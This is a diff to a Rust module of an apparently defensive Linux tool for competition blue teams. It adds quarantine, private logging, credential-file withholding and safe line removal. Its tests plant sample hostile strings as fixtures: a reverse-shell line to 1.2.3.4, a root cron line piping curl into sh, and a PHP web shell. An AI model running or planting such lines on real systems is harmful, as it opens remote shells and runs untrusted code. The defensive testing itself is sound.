@@ -8,14 +8,257 @@
 //! [`emit`](DefenderContext::emit) send structured [`Finding`]s to the UI
 //! thread rather than printing to stdout.
 
-use std::fs::OpenOptions;
+use std::fs::{File, OpenOptions};
 use std::io::Write;
+use std::os::unix::fs::{DirBuilderExt, OpenOptionsExt, PermissionsExt};
 use std::path::{Path, PathBuf};
 use std::sync::mpsc::Sender;
 use std::time::{Duration, SystemTime};
 
 use super::Result;
 use super::finding::{Finding, Severity};
+
+/// Root-only directory for reports, evidence and score logs written by the TUI.
+///
+/// These used to live at fixed names in `/tmp`, world-readable, where any
+/// local user could read the evidence or pre-create the file to make every
+/// write fail.
+pub const LOG_DIR: &str = "/var/log/linux-defender";
+
+/// Path for a log file called `name` inside [`LOG_DIR`], creating the
+/// directory `0700` if needed.
+pub fn log_path(name: &str) -> PathBuf {
+    let dir = Path::new(LOG_DIR);
+    let _ = std::fs::DirBuilder::new()
+        .recursive(true)
+        .mode(0o700)
+        .create(dir);
+    let _ = std::fs::set_permissions(dir, std::fs::Permissions::from_mode(0o700));
+    dir.join(name)
+}
+
+/// Open `path` for appending, creating it `0600` and refusing to follow a
+/// symlink at the final component.
+pub fn open_private_append(path: &Path) -> std::io::Result<File> {
+    OpenOptions::new()
+        .create(true)
+        .append(true)
+        .mode(0o600)
+        .custom_flags(libc::O_NOFOLLOW)
+        .open(path)
+}
+
+/// Default root for quarantined files. Override with
+/// `LINUX_DEFENDER_QUARANTINE_DIR`.
+pub const QUARANTINE_DIR: &str = "/var/lib/linux-defender/quarantine";
+
+/// Quarantine root currently in effect.
+pub fn quarantine_root() -> PathBuf {
+    std::env::var_os("LINUX_DEFENDER_QUARANTINE_DIR")
+        .map(PathBuf::from)
+        .unwrap_or_else(|| PathBuf::from(QUARANTINE_DIR))
+}
+
+/// Where `path` goes in the quarantine: `<root>/<timestamp>/<path>`, keeping
+/// the original absolute path so it is obvious where to put it back.
+fn quarantine_dest(path: &Path) -> std::io::Result<PathBuf> {
+    quarantine_dest_in(&new_quarantine_batch()?, path)
+}
+
+/// Create the quarantine root (0700) and return a fresh timestamped batch
+/// directory path inside it.
+fn new_quarantine_batch() -> std::io::Result<PathBuf> {
+    let root = quarantine_root();
+    std::fs::DirBuilder::new()
+        .recursive(true)
+        .mode(0o700)
+        .create(&root)?;
+    std::fs::set_permissions(&root, std::fs::Permissions::from_mode(0o700))?;
+    let stamp = chrono::Local::now().format("%Y%m%dT%H%M%S%.6f").to_string();
+    Ok(root.join(stamp))
+}
+
+/// Destination for `path` inside an existing quarantine `batch`.
+fn quarantine_dest_in(batch: &Path, path: &Path) -> std::io::Result<PathBuf> {
+    let rel = path.strip_prefix("/").unwrap_or(path);
+    let dest = batch.join(rel);
+    if let Some(parent) = dest.parent() {
+        std::fs::create_dir_all(parent)?;
+    }
+    Ok(dest)
+}
+
+/// Copy `src` to `dest` with `cp -a`, preserving owner, mode, timestamps and
+/// symlinks.
+fn cp_preserving(src: &Path, dest: &Path) -> std::io::Result<()> {
+    let out = std::process::Command::new("cp")
+        .arg("-a")
+        .arg("--")
+        .arg(src)
+        .arg(dest)
+        .output()?;
+    if out.status.success() {
+        Ok(())
+    } else {
+        Err(std::io::Error::other(
+            String::from_utf8_lossy(&out.stderr).trim().to_string(),
+        ))
+    }
+}
+
+/// Move `path` (file, directory or symlink) into the quarantine and return
+/// its new location. Falls back to copy-then-remove across filesystems.
+pub fn quarantine(path: &Path) -> std::io::Result<PathBuf> {
+    let dest = quarantine_dest(path)?;
+    move_into_quarantine(path, dest)
+}
+
+/// Move every entry inside `dir` into one quarantine batch, keeping `dir`
+/// itself. Returns the batch's copy of `dir` and any entries that failed.
+pub fn quarantine_dir_contents(
+    dir: &Path,
+) -> std::io::Result<(PathBuf, Vec<(PathBuf, std::io::Error)>)> {
+    let batch = new_quarantine_batch()?;
+    let mut failed = Vec::new();
+    for entry in std::fs::read_dir(dir)? {
+        let path = entry?.path();
+        let moved = quarantine_dest_in(&batch, &path).and_then(|d| move_into_quarantine(&path, d));
+        if let Err(e) = moved {
+            failed.push((path, e));
+        }
+    }
+    Ok((quarantine_dest_in(&batch, dir)?, failed))
+}
+
+/// Rename `path` to `dest`, falling back to copy-then-remove across
+/// filesystems.
+fn move_into_quarantine(path: &Path, dest: PathBuf) -> std::io::Result<PathBuf> {
+    // symlink_metadata: a dangling symlink still needs moving.
+    std::fs::symlink_metadata(path)?;
+    match std::fs::rename(path, &dest) {
+        Ok(()) => Ok(dest),
+        Err(e) if e.raw_os_error() == Some(libc::EXDEV) => {
+            cp_preserving(path, &dest)?;
+            let meta = std::fs::symlink_metadata(path)?;
+            if meta.is_dir() {
+                std::fs::remove_dir_all(path)?;
+            } else {
+                std::fs::remove_file(path)?;
+            }
+            Ok(dest)
+        }
+        Err(e) => Err(e),
+    }
+}
+
+/// Copy `path` into the quarantine, leaving the original in place. Used
+/// before a file is edited in place.
+pub fn quarantine_copy(path: &Path) -> std::io::Result<PathBuf> {
+    let dest = quarantine_dest(path)?;
+    cp_preserving(path, &dest)?;
+    Ok(dest)
+}
+
+/// Files whose contents must never be written into a report.
+fn is_secret_file(path: &Path) -> bool {
+    let name = path
+        .file_name()
+        .map(|n| n.to_string_lossy().to_ascii_lowercase())
+        .unwrap_or_default();
+    let stem = name.trim_end_matches('-');
+    matches!(stem, "shadow" | "gshadow" | "krb5.keytab" | "master.passwd")
+        || name.ends_with(".keytab")
+        || name.ends_with(".key")
+        || (name.starts_with("ssh_host_") && name.ends_with("_key"))
+        || matches!(
+            name.as_str(),
+            "id_rsa" | "id_ecdsa" | "id_ed25519" | "id_dsa" | "splunk.secret"
+        )
+}
+
+/// Replace the password hash field of an `/etc/shadow` line with a marker
+/// that says whether a usable hash was set, without revealing it.
+pub fn redact_shadow_line(line: &str) -> String {
+    let mut fields: Vec<&str> = line.split(':').collect();
+    if fields.len() < 2 {
+        return line.to_string();
+    }
+    fields[1] = match fields[1] {
+        "" => "<empty>",
+        h if h.starts_with('!') || h.starts_with('*') => "<locked>",
+        _ => "<hash redacted>",
+    };
+    fields.join(":")
+}
+
+/// Remove every line of `original` equal to `needle` (both trimmed). When a
+/// removed line opens a `{` block (a shell function header), the block's
+/// lines up to the matching `}` go with it. Returns the new text and how many
+/// lines were removed, or why nothing could be removed.
+pub fn remove_matching_lines(
+    original: &str,
+    needle: &str,
+) -> std::result::Result<(String, usize), &'static str> {
+    let needle = needle.trim();
+    if needle.is_empty() {
+        return Err("empty pattern");
+    }
+    let lines: Vec<&str> = original.lines().collect();
+    let mut keep = vec![true; lines.len()];
+    let mut removed = 0usize;
+    let mut i = 0;
+    while i < lines.len() {
+        if lines[i].trim() != needle {
+            i += 1;
+            continue;
+        }
+        let mut depth = brace_delta(lines[i]);
+        let mut end = i;
+        while depth > 0 {
+            end += 1;
+            if end >= lines.len() {
+                return Err("matched a block that never closes");
+            }
+            depth += brace_delta(lines[end]);
+        }
+        for k in &mut keep[i..=end] {
+            *k = false;
+        }
+        removed += end - i + 1;
+        i = end + 1;
+    }
+    if removed == 0 {
+        return Err("line not found");
+    }
+    let out: String = lines
+        .iter()
+        .zip(&keep)
+        .filter(|(_, k)| **k)
+        .map(|(l, _)| format!("{l}\n"))
+        .collect();
+    Ok((out, removed))
+}
+
+/// Opening minus closing braces on a line, ignoring anything after a `#`.
+fn brace_delta(line: &str) -> i64 {
+    let code = line.split('#').next().unwrap_or("");
+    code.matches('{').count() as i64 - code.matches('}').count() as i64
+}
+
+/// `Some(true)` if `bash -n` accepts `text`, `Some(false)` if it rejects it,
+/// `None` when bash cannot be run.
+fn shell_syntax_ok(text: &str) -> Option<bool> {
+    use std::io::Write as _;
+    let mut child = std::process::Command::new("bash")
+        .arg("-n")
+        .stdin(std::process::Stdio::piped())
+        .stdout(std::process::Stdio::null())
+        .stderr(std::process::Stdio::null())
+        .spawn()
+        .ok()?;
+    child.stdin.take()?.write_all(text.as_bytes()).ok()?;
+    child.wait().ok().map(|s| s.success())
+}
 
 /// State shared by every check in a single run.
 #[derive(Clone)]
@@ -35,6 +278,9 @@ pub struct DefenderContext {
     /// When the competition started — artifacts created after this time are
     /// flagged as more suspicious.
     pub competition_start: Option<SystemTime>,
+    /// Box type the operator confirmed (the TUI's box selection). When set,
+    /// checks use it instead of re-detecting from what is installed.
+    pub box_type: Option<super::BoxType>,
 }
 
 impl std::fmt::Debug for DefenderContext {
@@ -57,7 +303,19 @@ impl DefenderContext {
             finding_tx: None,
             progress_tx: None,
             competition_start: None,
+            box_type: None,
         }
+    }
+
+    /// Pin the box type, overriding detection.
+    pub fn with_box_type(mut self, box_type: super::BoxType) -> Self {
+        self.box_type = Some(box_type);
+        self
+    }
+
+    /// The pinned box type, or a fresh detection when none was set.
+    pub fn box_type(&self) -> super::BoxType {
+        self.box_type.unwrap_or_else(super::detect_box_type)
     }
 
     /// Attach a progress channel so that `progress()` sends lines to the TUI
@@ -114,10 +372,7 @@ impl DefenderContext {
 
     /// Append a line to the run's report file.
     pub fn log(&self, message: &str) -> Result {
-        let mut file = OpenOptions::new()
-            .create(true)
-            .append(true)
-            .open(&self.report_file)?;
+        let mut file = open_private_append(&self.report_file)?;
         writeln!(file, "{}", message)?;
         Ok(())
     }
@@ -144,7 +399,27 @@ impl DefenderContext {
         self.log_msg(&banner);
         let _ = self.log(&banner);
 
-        match std::fs::read(path) {
+        // Never copy credential material into a report. A red team routinely
+        // sets chattr +i on /etc/shadow, which sends that file through here.
+        if is_secret_file(path) {
+            let size = std::fs::metadata(path).map(|m| m.len()).unwrap_or(0);
+            let digest = crate::backups::hash::hash_file(path)
+                .unwrap_or_else(|e| format!("unavailable ({e})"));
+            for msg in [
+                format!("  size: {size} bytes"),
+                format!("  sha256: {digest}"),
+                "  (contents withheld: file holds credentials or key material)".to_string(),
+                "══ END EVIDENCE ══".to_string(),
+            ] {
+                self.log_msg(&msg);
+                let _ = self.log(&msg);
+            }
+            return;
+        }
+
+        // Bounded, non-blocking, regular files only: evidence paths are
+        // attacker-controlled and may be FIFOs or huge.
+        match crate::core::scan::read_regular_file(path, 1024 * 1024) {
             Err(e) => {
                 let msg = format!("  (could not read: {})", e);
                 self.log_msg(&msg);
@@ -210,7 +485,7 @@ impl DefenderContext {
     /// Failure messages are logged but do not panic — the module can decide how
     /// to handle a failed removal.
     pub fn remove_path_logged(&self, path: &Path) -> bool {
-        let action_banner = format!("══ ACTION: rm {} ══", path.display());
+        let action_banner = format!("══ ACTION: quarantine {} ══", path.display());
         self.log_msg(&action_banner);
         let _ = self.log(&action_banner);
 
@@ -237,20 +512,21 @@ impl DefenderContext {
             }
         }
 
-        let result = if path.is_dir() {
-            std::fs::remove_dir_all(path)
-        } else {
-            std::fs::remove_file(path)
-        };
-
-        match result {
-            Ok(()) => {
-                let msg = "  rm: OK";
-                self.log_msg(msg);
-                let _ = self.log(msg);
+        // Move, never delete: detection is heuristic, and a false positive
+        // has to be one `mv` away from undone.
+        match quarantine(path) {
+            Ok(dest) => {
+                let msg = format!(
+                    "  moved to quarantine: {} (restore with: mv '{}' '{}')",
+                    dest.display(),
+                    dest.display(),
+                    path.display()
+                );
+                self.log_msg(&msg);
+                let _ = self.log(&msg);
             }
             Err(e) => {
-                let msg = format!("  rm: FAILED — {}", e);
+                let msg = format!("  quarantine: FAILED — {}", e);
                 self.log_msg(&msg);
                 let _ = self.log(&msg);
                 // Still check proof below — file might have been gone already.
@@ -295,6 +571,16 @@ impl DefenderContext {
     /// Matches lines that contain `line_content` (substring match, trimmed).
     /// Returns `true` if the line was found and the file was rewritten cleanly.
     pub fn remove_line_from_file_logged(&self, path: &Path, line_content: &str) -> bool {
+        if line_content.trim().is_empty() {
+            // An empty needle would match every line.
+            let msg = format!(
+                "  refusing to remove an empty line pattern from {}",
+                path.display()
+            );
+            self.log_msg(&msg);
+            let _ = self.log(&msg);
+            return false;
+        }
         let action_msg = format!("══ ACTION: remove line from {} ══", path.display());
         self.log_msg(&action_msg);
         let _ = self.log(&action_msg);
@@ -329,30 +615,57 @@ impl DefenderContext {
             return false;
         };
 
-        let line_count_before = original.lines().count();
-        let filtered: Vec<&str> = original
-            .lines()
-            .filter(|l| !l.trim().contains(line_content.trim()))
-            .collect();
-        let line_count_after = filtered.len();
+        // Keep the untouched file in quarantine so the edit can be undone.
+        match quarantine_copy(path) {
+            Ok(dest) => {
+                let msg = format!("  original saved to {}", dest.display());
+                self.log_msg(&msg);
+                let _ = self.log(&msg);
+            }
+            Err(e) => {
+                let msg = format!(
+                    "  could not save original ({e}) — refusing to edit {}",
+                    path.display()
+                );
+                self.log_msg(&msg);
+                let _ = self.log(&msg);
+                return false;
+            }
+        }
 
-        if line_count_before == line_count_after {
-            let msg = "  line not found — no change made";
-            self.log_msg(msg);
-            let _ = self.log(msg);
+        let (new_content, removed_count) = match remove_matching_lines(&original, line_content) {
+            Ok(r) => r,
+            Err(why) => {
+                let msg = format!("  {why} — no change made");
+                self.log_msg(&msg);
+                let _ = self.log(&msg);
+                return false;
+            }
+        };
+
+        // Never turn a valid shell rc file into a broken one (a function left
+        // with an empty body is a syntax error that breaks every login).
+        if shell_syntax_ok(&original) == Some(true) && shell_syntax_ok(&new_content) == Some(false)
+        {
+            let msg = format!(
+                "  removing it would leave {} with a shell syntax error — edit by hand",
+                path.display()
+            );
+            self.log_msg(&msg);
+            let _ = self.log(&msg);
             return false;
         }
 
-        let new_content = filtered.join("\n") + "\n";
         match std::fs::write(path, new_content) {
             Ok(()) => {
-                let msg = format!("  removed {} line(s)", line_count_before - line_count_after);
+                let msg = format!("  removed {} line(s)", removed_count);
                 self.log_msg(&msg);
                 let _ = self.log(&msg);
 
                 // Proof: verify line is absent
+                let needle = line_content.trim();
                 let proof = std::fs::read_to_string(path)
-                    .map(|s| !s.contains(line_content.trim()))
+                    .map(|s| !s.lines().any(|l| l.trim() == needle))
                     .unwrap_or(false);
                 let proof_msg = format!("══ PROOF: line absent={} in {} ══", proof, path.display());
                 self.log_msg(&proof_msg);
@@ -528,5 +841,167 @@ impl DefenderContext {
             return format!("{} (after competition start — suspicious)", base);
         }
         base
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    /// One quarantine directory for every test in this module, set once:
+    /// tests run in parallel and share the process environment.
+    fn test_quarantine() -> &'static Path {
+        static DIR: std::sync::OnceLock<PathBuf> = std::sync::OnceLock::new();
+        DIR.get_or_init(|| {
+            let dir = tempfile::TempDir::new().unwrap().keep();
+            // SAFETY: set exactly once, before any test in this module reads it.
+            unsafe { std::env::set_var("LINUX_DEFENDER_QUARANTINE_DIR", &dir) };
+            dir
+        })
+    }
+
+    /// One test so the env override is set once, before any quarantine call.
+    #[test]
+    fn quarantine_moves_and_copies_instead_of_deleting() {
+        let q = test_quarantine();
+
+        let work = tempfile::TempDir::new().unwrap();
+        let file = work.path().join("evil.sh");
+        std::fs::write(&file, "payload").unwrap();
+        let moved = quarantine(&file).unwrap();
+        assert!(!file.exists());
+        assert!(moved.starts_with(q));
+        assert!(moved.ends_with(file.strip_prefix("/").unwrap()));
+        assert_eq!(std::fs::read_to_string(&moved).unwrap(), "payload");
+
+        let dir = work.path().join("drop");
+        std::fs::create_dir_all(dir.join("sub")).unwrap();
+        std::fs::write(dir.join("sub/x"), "x").unwrap();
+        let moved_dir = quarantine(&dir).unwrap();
+        assert!(!dir.exists());
+        assert!(moved_dir.join("sub/x").is_file());
+
+        let kept = work.path().join(".bashrc");
+        std::fs::write(&kept, "alias ls='ls'\n").unwrap();
+        let copy = quarantine_copy(&kept).unwrap();
+        assert!(kept.exists());
+        assert_eq!(std::fs::read_to_string(copy).unwrap(), "alias ls='ls'\n");
+
+        let mode = std::fs::metadata(q).unwrap().permissions().mode() & 0o777;
+        assert_eq!(mode, 0o700);
+
+        let site = work.path().join("html");
+        std::fs::create_dir_all(site.join("admin")).unwrap();
+        std::fs::write(site.join("index.php"), "<?php").unwrap();
+        std::fs::write(site.join("admin/shell.php"), "<?php system($_GET[c]);").unwrap();
+        let (saved, failed) = quarantine_dir_contents(&site).unwrap();
+        assert!(failed.is_empty());
+        assert!(site.is_dir());
+        assert_eq!(std::fs::read_dir(&site).unwrap().count(), 0);
+        assert!(saved.join("index.php").is_file());
+        assert!(saved.join("admin/shell.php").is_file());
+
+        // The logged helpers go through the same path.
+        let (tx, _rx) = std::sync::mpsc::channel();
+        let ctx = DefenderContext::new(work.path().join("report.txt"), false).with_progress(tx);
+        let victim = work.path().join("cron.d-evil");
+        std::fs::write(&victim, "* * * * * root curl x | sh\n").unwrap();
+        assert!(ctx.remove_path_logged(&victim));
+        assert!(!victim.exists());
+
+        let rc = work.path().join("profile");
+        std::fs::write(&rc, "export A=1\nbash -i >& /dev/tcp/1.2.3.4/9 0>&1\n").unwrap();
+        assert!(ctx.remove_line_from_file_logged(&rc, "bash -i >& /dev/tcp/1.2.3.4/9 0>&1"));
+        assert_eq!(std::fs::read_to_string(&rc).unwrap(), "export A=1\n");
+    }
+
+    #[test]
+    fn pinned_box_type_overrides_detection() {
+        for bt in crate::core::BoxType::ALL {
+            let ctx = DefenderContext::new(PathBuf::from("/dev/null"), false).with_box_type(*bt);
+            assert_eq!(ctx.box_type(), *bt);
+        }
+    }
+
+    #[test]
+    fn line_removal_is_exact_and_takes_whole_function_blocks() {
+        let rc = "export PATH=/usr/bin\npasswd () {\n    echo blocked\n}\nalias ll='ls -l'\n";
+        let (out, n) = remove_matching_lines(rc, "passwd () {").unwrap();
+        assert_eq!(n, 3);
+        assert_eq!(out, "export PATH=/usr/bin\nalias ll='ls -l'\n");
+
+        // Substrings no longer match.
+        assert!(remove_matching_lines("export A=curl-helper\n", "curl").is_err());
+        assert!(remove_matching_lines("a\nb\n", "").is_err());
+        assert!(remove_matching_lines("f() {\n  x\n", "f() {").is_err());
+    }
+
+    #[test]
+    fn edit_that_would_break_shell_syntax_is_refused() {
+        test_quarantine();
+        let dir = tempfile::TempDir::new().unwrap();
+        let rc = dir.path().join(".bashrc");
+        let text = "greet() {\n  bash -i >& /dev/tcp/1.2.3.4/9 0>&1\n}\n";
+        std::fs::write(&rc, text).unwrap();
+        let (tx, _rx) = std::sync::mpsc::channel();
+        let ctx = DefenderContext::new(dir.path().join("r.txt"), false).with_progress(tx);
+        if shell_syntax_ok("true\n") == Some(true) {
+            // Leaving `greet() {\n}` would be a syntax error.
+            assert!(!ctx.remove_line_from_file_logged(&rc, "bash -i >& /dev/tcp/1.2.3.4/9 0>&1"));
+            assert_eq!(std::fs::read_to_string(&rc).unwrap(), text);
+        }
+    }
+
+    #[test]
+    fn secret_files_are_recognised() {
+        for p in [
+            "/etc/shadow",
+            "/etc/shadow-",
+            "/etc/gshadow",
+            "/etc/krb5.keytab",
+            "/etc/ssh/ssh_host_ed25519_key",
+            "/root/.ssh/id_rsa",
+            "/etc/ssl/private/site.key",
+        ] {
+            assert!(is_secret_file(Path::new(p)), "{p} should be withheld");
+        }
+        for p in [
+            "/etc/passwd",
+            "/etc/ssh/sshd_config",
+            "/etc/ssh/ssh_host_rsa_key.pub",
+        ] {
+            assert!(!is_secret_file(Path::new(p)), "{p} should be logged");
+        }
+    }
+
+    #[test]
+    fn shadow_lines_lose_their_hash() {
+        assert_eq!(
+            redact_shadow_line("toor:$6$salt$hash:19000:0:99999:7:::"),
+            "toor:<hash redacted>:19000:0:99999:7:::"
+        );
+        assert_eq!(
+            redact_shadow_line("svc:!:19000::::::"),
+            "svc:<locked>:19000::::::"
+        );
+        assert_eq!(
+            redact_shadow_line("x::19000::::::"),
+            "x:<empty>:19000::::::"
+        );
+    }
+
+    #[test]
+    fn private_append_creates_0600_and_refuses_symlinks() {
+        let dir = tempfile::TempDir::new().unwrap();
+        let log = dir.path().join("report.log");
+        open_private_append(&log).unwrap();
+        let mode = std::fs::metadata(&log).unwrap().permissions().mode() & 0o777;
+        assert_eq!(mode, 0o600);
+
+        let target = dir.path().join("target");
+        std::fs::write(&target, "").unwrap();
+        let link = dir.path().join("link.log");
+        std::os::unix::fs::symlink(&target, &link).unwrap();
+        assert!(open_private_append(&link).is_err());
     }
 }
